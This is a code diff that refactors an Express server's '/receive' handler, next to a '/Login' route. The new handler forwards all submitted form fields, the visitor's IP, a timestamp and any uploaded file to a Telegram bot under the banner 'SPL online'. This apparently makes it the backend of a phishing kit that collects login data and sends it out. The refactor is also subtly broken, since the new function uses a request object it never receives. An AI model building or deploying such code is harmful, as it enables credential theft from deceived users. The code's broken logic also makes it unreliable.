@@ -146,43 +146,60 @@ app.get('/Login', (req, res) => {
 });
 
 app.post('/receive', (req, res) => {
+  if (req.is('multipart/form-data')) {
+    handleMultipartForm(req, res);
+  } else {
+    handleUrlEncodedOrJson(req, res);
+  }
+});
+
+
+// Function to handle multipart/form-data
+function handleMultipartForm(req, res) {
   const form = formidable({ multiples: true });
 
   form.parse(req, (err, fields, files) => {
     if (err) {
-      res.status(500).send('An error occurred while processing the form.');
-      return;
+      return res.status(500).send('An error occurred while processing the form.');
     }
 
     if (!Object.values(fields).some(value => value)) {
-      res.status(400).send('Form submitted but all fields are empty!');
-      return;
+      return res.status(400).send('Form submitted but all fields are empty!');
     }
 
-    let message = '✅ SPL online\n\n';
-    for (const [key, value] of Object.entries(fields)) {
-      if (key !== 'visitor') {
-        message += `${key}: ${value}\n`;
-      }
-    }
-
-    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    message += `🌍 ${userIP}\n`;
-    message += `🕜 ${new Date().toLocaleString()}\n`;
-
-    if (files.file && files.file.size > 0) {
-      const filePath = files.file.filepath;
-      const fileName = files.file.originalFilename;
-      const fileType = files.file.mimetype;
-
-      sendFileToTelegram(filePath, fileName, fileType, fields.visitor);
-      res.json({ status: 'success', message: 'File sent to Telegram.' });
-    } else {
-      sendMessageToTelegram(message);
-      res.json({ status: 'success', message: 'Message sent to Telegram.' });
-    }
+    processAndSendData(fields, files, res);
   });
-});
+}
+
+// Function to handle URL-encoded or JSON data
+function handleUrlEncodedOrJson(req, res) {
+  const fields = req.body;
+  processAndSendData(fields, null, res);
+}
+
+// Common function to process and send data
+function processAndSendData(fields, files, res) {
+  let message = '✅ SPL online\n\n';
+  for (const [key, value] of Object.entries(fields)) {
+    if (key !== 'visitor') {
+      message += `${key}: ${value}\n`;
+    }
+  }
+
+  const userIP = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
+  message += `🌍 ${userIP}\n`;
+  message += `🕜 ${new Date().toLocaleString()}\n`;
+
+  if (files && files.file && files.file.size > 0) {
+    const { filepath: filePath, originalFilename: fileName, mimetype: fileType } = files.file;
+    sendFileToTelegram(filePath, fileName, fileType, fields.visitor);
+    res.json({ status: 'success', message: 'File sent to Telegram.' });
+  } else {
+    sendMessageToTelegram(message);
+    res.json({ status: 'success', message: 'Message sent to Telegram.' });
+  }
+}
+
 
 function sendMessageToTelegram(message) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
